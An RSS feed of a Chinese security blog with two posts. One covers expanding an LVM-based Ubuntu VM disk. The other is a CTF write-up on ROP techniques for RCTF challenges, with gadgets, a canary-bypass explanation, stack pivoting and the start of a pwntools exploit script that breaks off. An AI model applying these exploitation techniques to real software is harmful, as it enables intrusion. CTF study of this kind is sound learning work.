<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Wed, 12 Jul 2017 04:31:20 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>对虚拟机进行磁盘扩容🐥</title>
      <link>http://0x48.pw/2017/07/12/0x34/</link>
      <guid>http://0x48.pw/2017/07/12/0x34/</guid>
      <pubDate>Wed, 12 Jul 2017 02:30:39 GMT</pubDate>
      <description>
      
        &lt;p&gt;昨天傻逼了一下午，来记录下我从傻逼到醒悟到解决问题的过程&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>昨天傻逼了一下午，来记录下我从傻逼到醒悟到解决问题的过程</p>
<a id="more"></a>
<p>在给虚拟机装系统的时候，磁盘只有15G，昨天觉得少了，然后加到了30G，但是这只是增加了磁盘的容量，并没有影响到分区，系统的分区还是装系统的时候状态，只有15G。</p>
<p>这里提下，系统是Ubuntu 16.04 64位，使用LVM类型。</p>
<p>然后我做的第一件傻逼的事就是没对虚拟机做快照，就去修改分区.然后改错了，无法启动了……绝望了一段时间，还好后面修改回来了，所以第一个建议是，在修改分区之前，先做快照….这样改错了后还可以恢复回来….</p>
<p>然后傻逼的第二件事就是对分区理解错了，原本是有三个分区，一个<code>/dev/sda1</code>作为启动分区，挂载<code>/boot</code>，没啥问题，第二个是扩展分区<code>/dev/sda2</code>，有15.2G，然后第三个是<code>/dev/sda5</code>，为逻辑分区，也是有15.2G，最开始，我以为是sda2+sda5一共30G左右，然后踩坑了，使用<code>fdisk /dev/sda</code>进行分区，把<code>sda2</code>删除，然后新建一个主分区<code>sda2</code>，然后<code>sda5</code>就没有了，就剩一个30G的<code>sda2</code>。</p>
<p>我一开始理解成是原本的<code>sda2+sda5</code>合在一起，形成了一个有30G的<code>sda2</code>，现在想想，我当时好傻逼啊…..</p>
<p>因为好久没弄这些了，知识点都忘光了，一个硬盘是有自己寻址模式的，起始有一块地方专门记载分区的地址，而这块地方只能记载4个地址，而在这个地方指向的分区都叫做主分区，但是后来，有些人说4个不够用啊，所以又出现了扩展分区和逻辑分区，也就是说，可以把写主分区地址的地方写上扩展分区的地址，而扩展分区的开头和硬盘类似，有一块放地址的空间，指向逻辑分区。</p>
<p>所以说，扩展分区实际上是不拿来用，是用来放逻辑分区地址的，或者可以想象成扩展分区是在一块磁盘上虚拟出的一块虚拟硬盘。</p>
<p>SATA硬盘是可以有11个逻辑分区的，从<code>sda5-sda15</code></p>
<p>所以开始看到的分区状态，磁盘只分了15G的内存出来给了逻辑分区，还要15G是没有被分区的，当把扩展分区删除了后，逻辑分区自然也没了，磁盘剩余空间就变30G了，所以分个主分区有30G。</p>
<p>好了，概念讲完后，说说我最后是怎么解决的吧。</p>
<p>因为写blog之前我已经成功扩容了，所以我现在分区已经有30G了，我现在把它扩容到40G，首先是我虚拟机现在的状态：</p>
<p>首先是分区情况：</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># fdisk -l</span></div><div class="line">Disk /dev/sda:<span class="number"> 30 </span>GiB,<span class="number"> 32212254720 </span>bytes,<span class="number"> 62914560 </span>sectors</div><div class="line">.....</div><div class="line">Device     Boot    Start      End  Sectors  Size Id Type</div><div class="line">/dev/sda1  *       <span class="number"> 2048 </span> <span class="number"> 999423 </span> <span class="number"> 997376 </span> 487M<span class="number"> 83 </span>Linux</div><div class="line">/dev/sda2       <span class="number"> 1001470 </span>62890625<span class="number"> 61889156 </span>29.5G <span class="number"> 5 </span>Extended</div><div class="line">/dev/sda5       <span class="number"> 1001472 </span>33552383<span class="number"> 32550912 </span>15.5G 8e Linux LVM</div><div class="line">/dev/sda6      <span class="number"> 33554432 </span>62890625<span class="number"> 29336194 </span>  14G 8e Linux LVM</div><div class="line">....</div></pre></td></tr></table></figure>
<p>然后是挂载情况:</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># df -h</span></div><div class="line"><span class="string">...</span></div><div class="line"><span class="string">/dev/mapper/ubuntu--vg-root</span>   28G  3.3G   24G  13% /</div><div class="line"><span class="string">...</span></div></pre></td></tr></table></figure>
<p>因为使用的是LVM，所以挂载的不是<code>/dev/sdax</code>到根目录，而是<code>/dev/mapper/ubuntu--vg-root</code></p>
<p>其中<code>ubuntu--vg</code>称为<code>volumn group</code>，然后<code>ubuntu--ng-root</code>称为<code>logic volumn</code>，可以这么想，<code>group</code>相当于一块硬盘，<code>logic volumn</code>是这块硬的分区。</p>
<p>比如还有一个<code>logic volumn</code>是<code>ubuntu--ng-swap</code>，作为交换分区。</p>
<p>现在我们先设置虚拟机，把硬盘加到40G，然后重启虚拟机查看下：</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># fdisk -l</span></div><div class="line">Disk /dev/sda:<span class="number"> 40 </span>GiB,<span class="number"> 42949672960 </span>bytes,<span class="number"> 83886080 </span>sectors</div><div class="line">.....</div><div class="line">Device     Boot    Start      End  Sectors  Size Id Type</div><div class="line">/dev/sda1  *       <span class="number"> 2048 </span> <span class="number"> 999423 </span> <span class="number"> 997376 </span> 487M<span class="number"> 83 </span>Linux</div><div class="line">/dev/sda2       <span class="number"> 1001470 </span>62890625<span class="number"> 61889156 </span>29.5G <span class="number"> 5 </span>Extended</div><div class="line">/dev/sda5       <span class="number"> 1001472 </span>33552383<span class="number"> 32550912 </span>15.5G 8e Linux LVM</div><div class="line">/dev/sda6      <span class="number"> 33554432 </span>62890625<span class="number"> 29336194 </span>  14G 8e Linux LVM</div></pre></td></tr></table></figure>
<p>首先对扩展分区进行扩容，使用的命令是<code>parted</code></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"># parted</div><div class="line">root@ubuntu:~# parted</div><div class="line">GNU Parted 3.2</div><div class="line">Using /dev/sda</div><div class="line">Welcome to GNU Parted! Type 'help' to view a list of commands.</div><div class="line">(parted) help</div><div class="line">  align-check TYPE N                        check partition N for TYPE(min|opt) alignment</div><div class="line">  help [COMMAND]                           print general help, or help on COMMAND</div><div class="line">  mklabel,mktable LABEL-TYPE               <span class="keyword">create</span> a new disklabel (<span class="keyword">partition</span> table)</div><div class="line">  mkpart PART-<span class="built_in">TYPE</span> [FS-<span class="built_in">TYPE</span>] <span class="keyword">START</span> <span class="keyword">END</span>     make a <span class="keyword">partition</span></div><div class="line">  name <span class="keyword">NUMBER</span> NAME                         name <span class="keyword">partition</span> <span class="keyword">NUMBER</span> <span class="keyword">as</span> NAME</div><div class="line">  print [devices|free|list,<span class="keyword">all</span>|<span class="keyword">NUMBER</span>]     display the <span class="keyword">partition</span> table, available devices, free space, <span class="keyword">all</span> found partitions, <span class="keyword">or</span> a particular <span class="keyword">partition</span></div><div class="line">  quit                                     exit program</div><div class="line">  rescue <span class="keyword">START</span> <span class="keyword">END</span>                         rescue a lost <span class="keyword">partition</span> near <span class="keyword">START</span> <span class="keyword">and</span> <span class="keyword">END</span></div><div class="line">  resizepart <span class="keyword">NUMBER</span> <span class="keyword">END</span>                    resize <span class="keyword">partition</span> <span class="keyword">NUMBER</span></div><div class="line">  rm <span class="keyword">NUMBER</span>                                <span class="keyword">delete</span> <span class="keyword">partition</span> <span class="keyword">NUMBER</span></div><div class="line">  <span class="keyword">select</span> DEVICE                            choose the device <span class="keyword">to</span> edit</div><div class="line">  disk_set FLAG STATE                      change the FLAG <span class="keyword">on</span> selected device</div><div class="line">  disk_toggle [FLAG]                       toggle the state of FLAG <span class="keyword">on</span> selected device</div><div class="line">  <span class="keyword">set</span> <span class="keyword">NUMBER</span> FLAG STATE                    change the FLAG <span class="keyword">on</span> <span class="keyword">partition</span> <span class="keyword">NUMBER</span></div><div class="line">  toggle [<span class="keyword">NUMBER</span> [FLAG]]                   toggle the state of FLAG <span class="keyword">on</span> <span class="keyword">partition</span> <span class="keyword">NUMBER</span></div><div class="line">  unit UNIT                                <span class="keyword">set</span> the default unit <span class="keyword">to</span> UNIT</div><div class="line">  version                                  display the version <span class="keyword">number</span> <span class="keyword">and</span> copyright information of GNU Parted</div><div class="line">(parted) print</div><div class="line"> Model: VMware Virtual disk (scsi)</div><div class="line">Disk /dev/sda: <span class="number">42.9</span>GB</div><div class="line">Sector size (logical/physical): <span class="number">512</span>B/<span class="number">512</span>B</div><div class="line"><span class="keyword">Partition</span> Table: msdos</div><div class="line">Disk Flags:</div><div class="line"></div><div class="line"><span class="keyword">Number</span>  <span class="keyword">Start</span>   <span class="keyword">End</span>     Size    <span class="built_in">Type</span>      File <span class="keyword">system</span>  Flags</div><div class="line"> <span class="number">1</span>      <span class="number">1049</span>kB  <span class="number">512</span>MB   <span class="number">511</span>MB   <span class="keyword">primary</span>   ext2         boot</div><div class="line"> <span class="number">2</span>      <span class="number">513</span>MB   <span class="number">32.2</span>GB  <span class="number">31.7</span>GB  extended</div><div class="line"> <span class="number">5</span>      <span class="number">513</span>MB   <span class="number">17.2</span>GB  <span class="number">16.7</span>GB  logical                lvm</div><div class="line"> <span class="number">6</span>      <span class="number">17.2</span>GB  <span class="number">32.2</span>GB  <span class="number">15.0</span>GB  logical                lvm</div><div class="line">(parted) resizepart <span class="number">2</span> <span class="number">42.9</span>G</div><div class="line">(parted) print</div><div class="line">Model: VMware Virtual disk (scsi)</div><div class="line">Disk /dev/sda: <span class="number">42.9</span>GB</div><div class="line">Sector size (logical/physical): <span class="number">512</span>B/<span class="number">512</span>B</div><div class="line"><span class="keyword">Partition</span> Table: msdos</div><div class="line">Disk Flags:</div><div class="line"></div><div class="line"><span class="keyword">Number</span>  <span class="keyword">Start</span>   <span class="keyword">End</span>     Size    <span class="built_in">Type</span>      File <span class="keyword">system</span>  Flags</div><div class="line"> <span class="number">1</span>      <span class="number">1049</span>kB  <span class="number">512</span>MB   <span class="number">511</span>MB   <span class="keyword">primary</span>   ext2         boot</div><div class="line"> <span class="number">2</span>      <span class="number">513</span>MB   <span class="number">42.9</span>GB  <span class="number">42.4</span>GB  extended</div><div class="line"> <span class="number">5</span>      <span class="number">513</span>MB   <span class="number">17.2</span>GB  <span class="number">16.7</span>GB  logical                lvm</div><div class="line"> <span class="number">6</span>      <span class="number">17.2</span>GB  <span class="number">32.2</span>GB  <span class="number">15.0</span>GB  logical                lvm</div><div class="line">(parted) quit</div><div class="line">Information: You may need <span class="keyword">to</span> <span class="keyword">update</span> /etc/fstab.</div><div class="line"></div><div class="line"># fdisk -l</div><div class="line">....</div><div class="line">Device     Boot    <span class="keyword">Start</span>      <span class="keyword">End</span>  Sectors  Size Id <span class="built_in">Type</span></div><div class="line">/dev/sda1  *        <span class="number">2048</span>   <span class="number">999423</span>   <span class="number">997376</span>  <span class="number">487</span>M <span class="number">83</span> Linux</div><div class="line">/dev/sda2        <span class="number">1001470</span> <span class="number">83789062</span> <span class="number">82787593</span> <span class="number">39.5</span>G  <span class="number">5</span> Extended</div><div class="line">/dev/sda5        <span class="number">1001472</span> <span class="number">33552383</span> <span class="number">32550912</span> <span class="number">15.5</span>G <span class="number">8</span><span class="built_in">e</span> Linux LVM</div><div class="line">/dev/sda6       <span class="number">33554432</span> <span class="number">62890625</span> <span class="number">29336194</span>   <span class="number">14</span>G <span class="number">8</span><span class="built_in">e</span> Linux LVM</div><div class="line">....</div></pre></td></tr></table></figure>
<p>然后可以从扩展分区中再分出一个逻辑分区，因为<code>sda6</code>是我之前分出来的，还没有啥文件，所以所准备试试扩展下<code>sda6</code>分区，所以，首先是删除<code>sda6</code>分区，然后再新建：</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"># fdisk /dev/sda</div><div class="line">Welcome <span class="keyword">to</span> fdisk (util-linux <span class="number">2.27</span>.<span class="number">1</span>).</div><div class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide <span class="keyword">to</span> <span class="keyword">write</span> them.</div><div class="line">Be careful before <span class="keyword">using</span> the <span class="keyword">write</span> command.</div><div class="line"></div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> help): d</div><div class="line">Partition number (<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>, <span class="keyword">default</span> <span class="number">6</span>): <span class="number">6</span></div><div class="line"></div><div class="line">Partition <span class="number">6</span> <span class="keyword">has</span> been deleted.</div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> help): n</div><div class="line">Partition <span class="keyword">type</span></div><div class="line">   p   primary (<span class="number">1</span> primary, <span class="number">1</span> extended, <span class="number">2</span> free)</div><div class="line">   l   logical (numbered <span class="keyword">from</span> <span class="number">5</span>)</div><div class="line"><span class="keyword">Select</span> (<span class="keyword">default</span> p): l</div><div class="line"></div><div class="line">Adding logical partition <span class="number">6</span></div><div class="line">First sector (<span class="number">33554432</span>-<span class="number">83789062</span>, <span class="keyword">default</span> <span class="number">33554432</span>):</div><div class="line">Last sector, +sectors <span class="keyword">or</span> +size<span class="comment">&#123;K,M,G,T,P&#125;</span> (<span class="number">33554432</span>-<span class="number">83789062</span>, <span class="keyword">default</span> <span class="number">83789062</span>):</div><div class="line"></div><div class="line">Created a <span class="keyword">new</span> partition <span class="number">6</span> <span class="keyword">of</span> <span class="keyword">type</span> <span class="string">'Linux'</span> <span class="keyword">and</span> <span class="keyword">of</span> size <span class="number">24</span> GiB.</div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> help): w</div><div class="line">The partition table <span class="keyword">has</span> been altered.</div><div class="line">Calling ioctl() <span class="keyword">to</span> re-<span class="keyword">read</span> partition table.</div><div class="line">Re-reading the partition table failed.: Device <span class="keyword">or</span> resource busy</div><div class="line"></div><div class="line">The kernel still <span class="keyword">uses</span> the <span class="keyword">old</span> table. The <span class="keyword">new</span> table will be used at the next reboot <span class="keyword">or</span> after you run partprobe(<span class="number">8</span>) <span class="keyword">or</span> kpartx(<span class="number">8</span>).</div><div class="line"></div><div class="line"># fdisk -l</div><div class="line">.....</div><div class="line">Device     Boot    Start      <span class="keyword">End</span>  Sectors  Size Id <span class="keyword">Type</span></div><div class="line">/dev/sda1  *        <span class="number">2048</span>   <span class="number">999423</span>   <span class="number">997376</span>  <span class="number">487</span>M <span class="number">83</span> Linux</div><div class="line">/dev/sda2        <span class="number">1001470</span> <span class="number">83789062</span> <span class="number">82787593</span> <span class="number">39.5</span>G  <span class="number">5</span> Extended</div><div class="line">/dev/sda5        <span class="number">1001472</span> <span class="number">33552383</span> <span class="number">32550912</span> <span class="number">15.5</span>G <span class="number">8</span>e Linux LVM</div><div class="line">/dev/sda6       <span class="number">33554432</span> <span class="number">83789062</span> <span class="number">50234631</span>   <span class="number">24</span>G <span class="number">83</span> Linux</div><div class="line">.....</div></pre></td></tr></table></figure>
<p>然后就是扩展卷组了</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pvs</span></div><div class="line">  PV         VG        Fmt  Attr PSize  PFree</div><div class="line">  /dev/sda5  ubuntu-vg lvm2 <span class="keyword">a</span><span class="comment">--  15.52g    0</span></div><div class="line">  /dev/sda6  ubuntu-vg lvm2 <span class="keyword">a</span><span class="comment">--  13.98g    0</span></div><div class="line"><span class="comment"># pvresize /dev/sda6 +10G</span></div><div class="line">  Failed <span class="built_in">to</span> find device <span class="keyword">for</span> physical volume <span class="string">"+10G"</span>.</div><div class="line">  Physical volume <span class="string">"/dev/sda6"</span> changed</div><div class="line">  <span class="number">1</span> physical volume(s) resized / <span class="number">0</span> physical volume(s) <span class="keyword">not</span> resized</div><div class="line"><span class="comment"># pvs</span></div><div class="line">  PV         VG        Fmt  Attr PSize  PFree</div><div class="line">  /dev/sda5  ubuntu-vg lvm2 <span class="keyword">a</span><span class="comment">--  15.52g    0</span></div><div class="line">  /dev/sda6  ubuntu-vg lvm2 <span class="keyword">a</span><span class="comment">--  23.95g 9.96g</span></div><div class="line"><span class="comment"># vgs</span></div><div class="line">  VG        <span class="comment">#PV #LV #SN Attr   VSize  VFree</span></div><div class="line">  ubuntu-vg   <span class="number">2</span>   <span class="number">2</span>   <span class="number">0</span> wz<span class="comment">--n- 39.47g 9.96g</span></div><div class="line"><span class="comment"># lvs</span></div><div class="line">  LV     VG        Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</div><div class="line">  root   ubuntu-vg -wi-ao<span class="comment">---- 28.50g</span></div><div class="line">  swap_1 ubuntu-vg -wi-ao<span class="comment">----  1.00g</span></div><div class="line"><span class="comment"># lvresize -l +100%FREE /dev/mapper/ubuntu--vg-root</span></div><div class="line">  Size <span class="keyword">of</span> logical volume ubuntu-vg/root changed <span class="built_in">from</span> <span class="number">28.50</span> GiB (<span class="number">7297</span> <span class="built_in">extents</span>) <span class="built_in">to</span> <span class="number">38.47</span> GiB (<span class="number">9848</span> <span class="built_in">extents</span>).</div><div class="line">  Logical volume root successfully resized.</div><div class="line"><span class="comment"># lvs</span></div><div class="line">  LV     VG        Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</div><div class="line">  root   ubuntu-vg -wi-ao<span class="comment">---- 38.47g</span></div><div class="line">  swap_1 ubuntu-vg -wi-ao<span class="comment">----  1.00g</span></div><div class="line"><span class="comment"># df -h</span></div><div class="line">Filesystem                   Size  Used Avail Use% Mounted <span class="keyword">on</span></div><div class="line">......</div><div class="line">/dev/mapper/ubuntu<span class="comment">--vg-root   28G  3.3G   24G  13% /</span></div><div class="line">......</div><div class="line"><span class="comment"># resize2fs -p /dev/mapper/ubuntu--vg-root</span></div><div class="line">resize2fs <span class="number">1.42</span><span class="number">.13</span> (<span class="number">17</span>-May<span class="number">-2015</span>)</div><div class="line">Filesystem <span class="keyword">at</span> /dev/mapper/ubuntu<span class="comment">--vg-root is mounted on /; on-line resizing required</span></div><div class="line">old_desc_blocks = <span class="number">2</span>, new_desc_blocks = <span class="number">3</span></div><div class="line">The filesystem <span class="keyword">on</span> /<span class="title">dev</span>/<span class="title">mapper</span>/<span class="title">ubuntu--vg-root</span> <span class="title">is</span> <span class="title">now</span> <span class="title">10084352</span> (<span class="title">4k</span>) <span class="title">blocks</span> <span class="title">long</span>.</div><div class="line"></div><div class="line"><span class="comment"># df -h</span></div><div class="line">Filesystem                   Size  Used Avail Use% Mounted <span class="keyword">on</span></div><div class="line">......</div><div class="line">/dev/mapper/ubuntu<span class="comment">--vg-root   38G  3.3G   33G   9% /</span></div><div class="line">......</div><div class="line"><span class="comment"># reboot</span></div></pre></td></tr></table></figure>
<p>好了，现在，根目录的容量扩展好了</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/07/12/0x34/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ROP小结</title>
      <link>http://0x48.pw/2017/05/23/0x33/</link>
      <guid>http://0x48.pw/2017/05/23/0x33/</guid>
      <pubDate>Tue, 23 May 2017 04:01:12 GMT</pubDate>
      <description>
      
        &lt;p&gt;这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。</p>
<a id="more"></a>
<p>本文不进行实例调试，用脑子DEBUG……详细文件可以去我的github上找…</p>
<h1 id="RCalc"><a href="#RCalc" class="headerlink" title="RCalc"></a>RCalc</h1><p>首先是计算器这题，作者自己实现了一个canary，首先在每个函数开头通过<code>sub_400AAB</code>函数生成了一个随机数，存放到堆中，和栈上面，然后在函数结尾使用<code>sub_400B92</code>函数检查这个栈上的随机数和堆中的随机数是否一样。</p>
<p>然后可以去看看<code>sub_400A06</code>函数，在存放canary的堆上面有个一个0x100的堆，用于存放需要保存的计算结果，这个结果保存的函数没设定边界值，所以可以覆盖到canary的堆，从而覆盖到canary。</p>
<p>绕过canary后，在<code>sub_400FA2</code>函数中，scanf函数存在栈溢出，正常情况下想，之后就是通过ROP很容易就能getshell了。</p>
<p>但是，这里有一个坑点，scanf函数的<code>%s</code>不能出现<code>\x09</code>, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code>, <code>\x0d</code>, <code>\x20</code></p>
<p>经过测试，如果输入中出现这几个字符，会被转成<code>\x00</code>，或者之后的数据就不会被读入变量中。</p>
<p>这对我来说非常致命，因为got表的地址中都含有<code>\x20</code>，还有一些ROP被这些字符限制着，当时还想到了一个别的思路，比如利用<code>read</code>函数或者<code>sub_400c4e</code>函数，但是没找到控制rdx的ROP所以没法用<code>read</code>函数，另外，就算能调用，也没有思路下一步该怎么做，该读到什么位置？然后该怎么通过<code>read</code>继续溢出？</p>
<p>而关于<code>sub_400c4e</code>函数，虽然函数中含有<code>\x0c</code>字符，但是我找到了一个</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">add</span> eax, 0x48002018 ; <span class="attribute">test</span> eax, eax ; <span class="attribute">je</span> 0x400803 ; <span class="attribute">call</span> rax</div></pre></td></tr></table></figure>
<p>通过这个ROP就能调用<code>sub_400c4e</code>了，而<code>rdx</code>为最后一次choice输入的值，因为处理这个输入值得时候有个cdqe，虽然如果我输入0x100000005在判断中也是5，通过这个思路，可以让<code>sub_400c4e</code>函数中进行溢出，rdi和rsi也都是可控的。</p>
<p>但是在测试中发现，首先我不知道栈地址，所以没法控制rsi，而在<code>sub_400FA2</code>函数的ret指令时，rsi正好就是一个栈地址，在当前栈地址的很上面，这种情况下，栈溢出会覆盖掉<code>sub_400c4e</code>的局部变量，导致没法成功进行栈溢出。</p>
<p>在比赛结束之后，看来国外的一篇wp后，学到了两个知识点: <a href="http://hama.hatenadiary.jp/entry/2017/05/22/092142" target="_blank" rel="external">http://hama.hatenadiary.jp/entry/2017/05/22/092142</a></p>
<p>首先是他们找的ROP：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">mov</span> rdx, r13 ; <span class="attribute">mov</span> rsi, r14 ; <span class="attribute">mov</span> edi, r15d ; <span class="attribute">call</span> qword [r12+rbx*<span class="number">8</span>];</div><div class="line"><span class="attribute">pop</span> rbx ; <span class="attribute">pop</span> rbp ; <span class="attribute">pop</span> r12 ; <span class="attribute">pop</span> r13 ; <span class="attribute">pop</span> r14 ; <span class="attribute">pop</span> r15; <span class="attribute">ret</span> ;</div></pre></td></tr></table></figure>
<p>通过这个ROP基本可以调用任意函数了，我找ROP一般是使用默认的命令:</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> ROPgadget --<span class="keyword">binary</span> RCalc</div></pre></td></tr></table></figure>
<p>但是却没有这个ROP，需要用</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">$</span> <span class="comment">ROPgadget</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">binary</span> <span class="comment">RCalc</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">depth</span> <span class="comment">11</span></div></pre></td></tr></table></figure>
<p>才有第二句ROP，而第一句还是没有。。所以我发现，我在找ROP上还是太菜了….</p>
<h2 id="UPDATE-20170528"><a href="#UPDATE-20170528" class="headerlink" title="UPDATE 20170528"></a><em>UPDATE 20170528</em></h2><p>经过大佬教育，原来这是64位程序中存在的一个万能ROP，这两句ROP在同一个函数里，而这个函数是gcc编译进程序中去的</p>
<hr>
<p>其实，当时我已经基本可以做到调用任意函数了，但是关键点还是第二点。</p>
<p>使用:</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">leave</span>  ; <span class="attribute">ret</span> ;</div></pre></td></tr></table></figure>
<p>来修改栈地址，这样一来思路就很清晰了。<br>找一段可以写的地址，比如bss区域，写入ROP，然后再把rsp修改成该地址，就可以getshell了，同read函数向bss区域写值，然后使用<code>leave</code>修改rsp</p>
<p>我还是太菜，从来没想过修改栈地址……</p>
<h1 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h1><p>本来也是一道简单的栈溢出，但循环的判断:</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">while(<span class="name">read</span>(<span class="number">0</span>, buf, <span class="number">0</span>x10)&gt;0)</div></pre></td></tr></table></figure>
<p>要栈溢出首先得先停了这个循环，在shell中可以使用ctrl+d表示EOF，但是脚本咋写？<br>发现pwntools可以用下面的命令发送EOF</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s = remote(xxxx,xx)</div><div class="line">s<span class="selector-class">.sock</span><span class="selector-class">.shutdown</span>(socket.SHUT_RW)</div></pre></td></tr></table></figure>
<p>但是这样我们没法继续输入了，所以我们需要发送一次payload就getflag，我们只能getflag而不能getshell，因为服务器已经关闭了接收我们数据的连接。</p>
<p>这题没有libc，所以写ROP又是一个技术活….</p>
<p>使用下面这个PoC:</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = <span class="string">"debug"</span></div><div class="line"><span class="comment"># context.terminal = ['terminator', '-x', 'bash', '-c']</span></div><div class="line">debug = 1</div><div class="line">if debug:</div><div class="line">    p = remote(<span class="string">"127.0.0.1"</span>, 10001)</div><div class="line"><span 